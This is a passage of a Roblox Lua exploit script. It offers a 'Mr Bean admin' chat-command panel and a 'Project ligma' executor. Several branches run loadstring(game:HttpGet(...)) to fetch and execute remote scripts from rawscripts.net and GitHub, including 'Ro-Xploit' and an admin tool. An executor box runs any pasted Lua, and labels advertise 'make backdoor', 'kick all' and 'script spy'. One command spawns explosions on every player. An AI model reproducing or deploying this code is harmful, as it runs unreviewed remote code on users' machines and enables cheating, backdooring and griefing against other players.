white.Parent = backo

local info = Instance.new("TextLabel")
info.Size = UDim2.new(0.9, 21, 0.9, 7)
info.Position = UDim2.new(0.0, 0, 0.0, 0)
info.BackgroundColor3 = Color3.new(0, 0, 0)
info.BorderColor3 = Color3.new(0, 0, 0)
info.BorderSizePixel = 0
info.Text = "Mr Bean admin made by team secret thanks for use my script :)"
info.BackgroundTransparency = 1
info.TextColor3 = Color3.new(0, 1, 0)
info.TextSize = 14
info.Parent = Rc
info.TextWrapped = true

local LPlayer = game.Players.LocalPlayer

LPlayer.Chatted:Connect(function(cht)
if cht:match(";cmds") then
Ui.Visible = true
end

local player = game.Players.LocalPlayer
if game.Players.LocalPlayer.Character then
local pchar = game.Players.LocalPlayer.Character

if cht:match(";kill me") then
game.Players.LocalPlayer.Character.Humanoid.Health = 0
end

if cht:match(";kick me") then
player:Kick("Mr bean admin has kick you...")
end

if cht:match(";duck me") then
local duck = Instance.new("SpecialMesh", pchar.Torso)
duck.MeshType = "FileMesh"
duck.MeshId = "http://www.roblox.com/asset/?id=9419831"
duck.TextureId = "http://www.roblox.com/asset/?id=9419827"
duck.Scale = Vector3.new(5, 5, 5)
pchar.Head.Transparency = 1
pchar["Left Arm"].Transparency = 1
pchar["Right Arm"].Transparency = 1
pchar["Left Leg"].Transparency = 1
pchar ["Right Leg"].Transparency = 1
end

if cht:match(";sit me") then
game.Players.LocalPlayer.Character.Humanoid.Sit = true
end

if cht:match(";boom me") then
for i,v in pairs(game.Players:GetChildren()) do
bomb = Instance.new("Explosion")
			bomb.Parent = v.Character.Torso
			bomb.Position = v.Character.Torso.Position
			bomb.BlastPressure = 10
			bomb.BlastRadius = 10
end
end
end
end)
end

if TextBox == 'require(7192763922).load("'..game.Players.LocalPlayer.Name..'")' then
local Ui = Instance.new("Frame")
Ui.Size = UDim2.new(0.0, 524, 0.0, 350)
Ui.Position = UDim2.new(0.2, 4, 0.0, -45)
Ui.BackgroundColor3 = Color3.new(1, 1, 1)
Ui.BorderColor3 = Color3.new(0, 0, 0)
Ui.BorderSizePixel = 9
Ui.Active = true
Ui.BackgroundTransparency = 0 
Ui.Draggable = true
Ui.Parent = gui

local White = Instance.new("Frame")
White.Size = UDim2.new(0.9, 52, 0.9, 36)
White.Position = UDim2.new(0.0, 0, 0.0, 0)
White.BackgroundColor3 = Color3.new(1, 1, 1)
White.BorderColor3 = Color3.new(1, 1, 1)
White.BorderSizePixel = 9
White.Active = false
White.BackgroundTransparency = 0.8
White.Draggable = true
White.Parent = Ui

local Main = Instance.new("ImageLabel")
Main.Size = UDim2.new(0.9, 52, 0.9, 36)
Main.Position = UDim2.new(0.0, 0, 0.0, 0)
Main.BackgroundColor3 = Color3.new(0, 0, 0)
Main.ImageColor3 = Color3.new(1, 1, 1)
Main.Image = "rbxassetid://130216881113545"
Main.ImageTransparency = 0
Main.Parent = Ui

Main.BackgroundTransparency = 1

local X = Instance.new("TextButton")
X.Size = UDim2.new(0.0, 77, 0.0, 49)
X.Position = UDim2.new(0.9, -25, 0.0, 0)
X.BackgroundColor3 = Color3.new(0, 0, 0)
X.BorderColor3 = Color3.new(0, 0, 0)
X.BorderSizePixel = 0
X.Text = ""
X.BackgroundTransparency = 1
X.TextColor3 = Color3.new(255, 255, 255)
X.Font = Enum.Font.Code
X.Parent = Ui
X.MouseButton1Click:Connect(function()
Ui:Remove()
end)
end
if TextBox == 'require(4874364435)("'..game.Players.LocalPlayer.Name..'")' then
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Idk-script-2-28418"))()
end

if TextBox == 'require(18665717275).load("'..game.Players.LocalPlayer.Name..'")' then
loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Grab%20V4.txt", true))()
end

if TextBox == 'require(7624679472)("'..game.Players.LocalPlayer.Name..'")' then
loadstring(game:HttpGet(('https://raw.githubusercontent.com/rusello25/scripts/main/IY%20Admin'),true))()
end

if TextBox == 'require(0x31051dacc).v2FIXED("'..game.Players.LocalPlayer.Name..'")' then
loadstring(game:HttpGet(('https://raw.githubusercontent.com/rusello25/scripts/main/k00pgui'),true))()
end

if TextBox == 'require(4159766103).load("'..game.Players.LocalPlayer.Name..'")' then
loadstring(game:HttpGet(('https://raw.githubusercontent.com/rusello25/scripts/main/Ro-Xploit'),true))()
end

if TextBox == 'require(5051243290).mml("'..game.Players.LocalPlayer.Name..'")' then
loadstring(game:HttpGet(('https://raw.githubusercontent.com/rusello25/scripts/main/mml%20admin'),true))()
end

if TextBox == 'require(10027382472)("'..game.Players.LocalPlayer.Name..'")' then
local pro = Instance.new("Frame")
pro.Size = UDim2.new(0.0, 595, 0.0, 409)
pro.Position = UDim2.new(0.0, 1, 0.0, -2)
pro.BackgroundColor3 = Color3.new(1, 1, 1)
pro.BorderColor3 = Color3.new(0, 0, 0)
pro.BorderSizePixel = 1
pro.Active = true
pro.BackgroundTransparency = 0
pro.Draggable = true
pro.Parent = gui

local namepro = Instance.new("TextLabel")
namepro.Size = UDim2.new(0.9, 60, 0.0, 19)
namepro.Position = UDim2.new(0.0, 0, 0.0, 0)
namepro.BackgroundColor3 = Color3.new(1, 1, 1)
namepro.BorderColor3 = Color3.new(0, 0, 0)
namepro.BorderSizePixel = 1
namepro.Text = "Project ligma"
namepro.BackgroundTransparency = 0
namepro.TextColor3 = Color3.new(0, 0, 0)
namepro.Font = Enum.Font.SourceSans
namepro.TextSize = 19
namepro.Parent = pro

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(0.5, 102, 0.9, -39)
TextBox.Position = UDim2.new(0.0, 34, 0.0, 34)
TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
TextBox.BorderColor3 = Color3.new(0, 0, 0)
TextBox.BorderSizePixel = 1
TextBox.Text = ""
TextBox.PlaceholderText = "Script here"
TextBox.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextColor3 = Color3.new(0, 0, 0)
TextBox.BackgroundTransparency = 0
TextBox.Font = Enum.Font.SourceSans
TextBox.TextSize = 14
TextBox.Parent = pro
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top
TextBox.ClearTextOnFocus = false
TextBox.MultiLine = true
TextBox.TextWrapped = true
TextBox.TextEditable = true

local Exe = Instance.new("TextButton")
Exe.Size = UDim2.new(0.0, 53, 0.5, -27)
Exe.Position = UDim2.new(0.8, -24, 0.0, 20)
Exe.BackgroundColor3 = Color3.new(1, 1, 1)
Exe.BorderColor3 = Color3.new(0, 0, 0)
Exe.BorderSizePixel = 1
Exe.Text = "Exe"
Exe.BackgroundTransparency = 0 
Exe.TextColor3 = Color3.new(0, 0, 0)
Exe.Font = Enum.Font.SourceSans
Exe.TextSize = 21
Exe.Parent = pro
Exe.MouseButton1Click:Connect(function()
assert(loadstring(TextBox.Text))()
end)

local clea = Instance.new("TextButton")
clea.Size = UDim2.new(0.0, 53, 0.5, 5)
clea.Position = UDim2.new(0.8, -24, 0.0, 199)
clea.BackgroundColor3 = Color3.new(1, 1, 1)
clea.BorderColor3 = Color3.new(0, 0, 0)
clea.BorderSizePixel = 1
clea.Text = "Clea"
clea.BackgroundTransparency = 0 
clea.TextColor3 = Color3.new(0, 0, 0)
clea.Font = Enum.Font.SourceSans
clea.TextSize = 21
clea.Parent = pro
clea.MouseButton1Click:Connect(function()
TextBox.Text = ""
end)

local priva = Instance.new("TextLabel")
priva.Size = UDim2.new(0.0, 89, 0.0, 20)
priva.Position = UDim2.new(0.8, 30, 0.0, 20)
priva.BackgroundColor3 = Color3.new(1, 1, 1)
priva.BorderColor3 = Color3.new(0, 0, 0)
priva.BorderSizePixel = 1
priva.Text = "private hax"
priva.BackgroundTransparency = 0 
priva.TextColor3 = Color3.new(0, 0, 0)
priva.Font = Enum.Font.SourceSans
priva.TextSize = 13
priva.Parent = pro

local game = Instance.new("TextLabel")
game.Size = UDim2.new(0.0, 89, 0.0, 20)
game.Position = UDim2.new(0.8, 30, 0.0, 41)
game.BackgroundColor3 = Color3.new(1, 1, 1)
game.BorderColor3 = Color3.new(0, 0, 0)
game.BorderSizePixel = 1
game.Text = "game cursor gui"
game.BackgroundTransparency = 0 
game.TextColor3 = Color3.new(0, 0, 0)
game.Font = Enum.Font.SourceSans
game.TextSize = 13
game.Parent = pro

local back = Instance.new("TextLabel")
back.Size = UDim2.new(0.0, 89, 0.0, 20)
back.Position = UDim2.new(0.8, 30, 0.0, 62)
back.BackgroundColor3 = Color3.new(1, 1, 1)
back.BorderColor3 = Color3.new(0, 0, 0)
back.BorderSizePixel = 1
back.Text = "make backdoor"
back.BackgroundTransparency = 0 
back.TextColor3 = Color3.new(0, 0, 0)
back.Font = Enum.Font.SourceSans
back.TextSize = 13
back.Parent = pro

local c00 = Instance.new("TextLabel")
c00.Size = UDim2.new(0.0, 89, 0.0, 20)
c00.Position = UDim2.new(0.8, 30, 0.0, 83)
c00.BackgroundColor3 = Color3.new(1, 1, 1)
c00.BorderColor3 = Color3.new(0, 0, 0)
c00.BorderSizePixel = 1
c00.Text = "c00lgui"
c00.BackgroundTransparency = 0 
c00.TextColor3 = Color3.new(0, 0, 0)
c00.Font = Enum.Font.SourceSans
c00.TextSize = 13
c00.Parent = pro

local game2 = Instance.new("TextLabel")
game2.Size = UDim2.new(0.0, 89, 0.0, 20)
game2.Position = UDim2.new(0.8, 30, 0.0, 104)
game2.BackgroundColor3 = Color3.new(1, 1, 1)
game2.BorderColor3 = Color3.new(0, 0, 0)
game2.BorderSizePixel = 1
game2.Text = "game cursor gui 2"
game2.BackgroundTransparency = 0 
game2.TextColor3 = Color3.new(0, 0, 0)
game2.Font = Enum.Font.SourceSans
game2.TextSize = 13
game2.Parent = pro

local dex = Instance.new("TextLabel")
dex.Size = UDim2.new(0.0, 89, 0.0, 20)
dex.Position = UDim2.new(0.8, 30, 0.0, 125)
dex.BackgroundColor3 = Color3.new(1, 1, 1)
dex.BorderColor3 = Color3.new(0, 0, 0)
dex.BorderSizePixel = 1
dex.Text = "Dex"
dex.BackgroundTransparency = 0 
dex.TextColor3 = Color3.new(0, 0, 0)
dex.Font = Enum.Font.SourceSans
dex.TextSize = 13
dex.Parent = pro

local hack = Instance.new("TextLabel")
hack.Size = UDim2.new(0.0, 89, 0.0, 20)
hack.Position = UDim2.new(0.8, 30, 0.0, 146)
hack.BackgroundColor3 = Color3.new(1, 1, 1)
hack.BorderColor3 = Color3.new(0, 0, 0)
hack.BorderSizePixel = 1
hack.Text = "hacker x"
hack.BackgroundTransparency = 0 
hack.TextColor3 = Color3.new(0, 0, 0)
hack.Font = Enum.Font.SourceSans
hack.TextSize = 13
hack.Parent = pro

local IY = Instance.new("TextLabel")
IY.Size = UDim2.new(0.0, 89, 0.0, 20)
IY.Position = UDim2.new(0.8, 30, 0.0, 167)
IY.BackgroundColor3 = Color3.new(1, 1, 1)
IY.BorderColor3 = Color3.new(0, 0, 0)
IY.BorderSizePixel = 1
IY.Text = "IY edited"
IY.BackgroundTransparency = 0 
IY.TextColor3 = Color3.new(0, 0, 0)
IY.Font = Enum.Font.SourceSans
IY.TextSize = 13
IY.Parent = pro

local kill = Instance.new("TextLabel")
kill.Size = UDim2.new(0.0, 89, 0.0, 20)
kill.Position = UDim2.new(0.8, 30, 0.0, 188)
kill.BackgroundColor3 = Color3.new(1, 1, 1)
kill.BorderColor3 = Color3.new(0, 0, 0)
kill.BorderSizePixel = 1
kill.Text = "kick all"
kill.BackgroundTransparency = 0 
kill.TextColor3 = Color3.new(0, 0, 0)
kill.Font = Enum.Font.SourceSans
kill.TextSize = 13
kill.Parent = pro

local scrip = Instance.new("TextLabel")
scrip.Size = UDim2.new(0.0, 89, 0.0, 20)
scrip.Position = UDim2.new(0.8, 30, 0.0, 209)
scrip.BackgroundColor3 = Color3.new(1, 1, 1)
scrip.BorderColor3 = Color3.new(0, 0, 0)
scrip.BorderSizePixel = 1
scrip.Text = "script spy"
scrip.BackgroundTransparency = 0 
scrip.TextColor3 = Color3.new(0, 0, 0)
scrip.Font = Enum.Font.SourceSans
scrip.TextSize = 13
scrip.Parent = pro

local c001 = Instance.new("TextLabel")
c001.Size = UDim2.new(0.0, 89, 0.0, 20)
c001.Position = UDim2.new(0.8, 30, 0.0, 230)
c001.BackgroundColor3 = Color3.new(1, 1, 1)
c001.BorderColor3 = Color3.new(0, 0, 0)
c001.BorderSizePixel = 1
c001.Text = "c00lgui v2"
c001.BackgroundTransparency = 0 
c001.TextColor3 = Color3.new(0, 0, 0)
c001.Font = Enum.Font.SourceSans
c001.TextSize = 13
c001.Parent = pro
end
end)

clearBtn.MouseButton1Click:Connect(function()
	TextBox.Text = ""
end)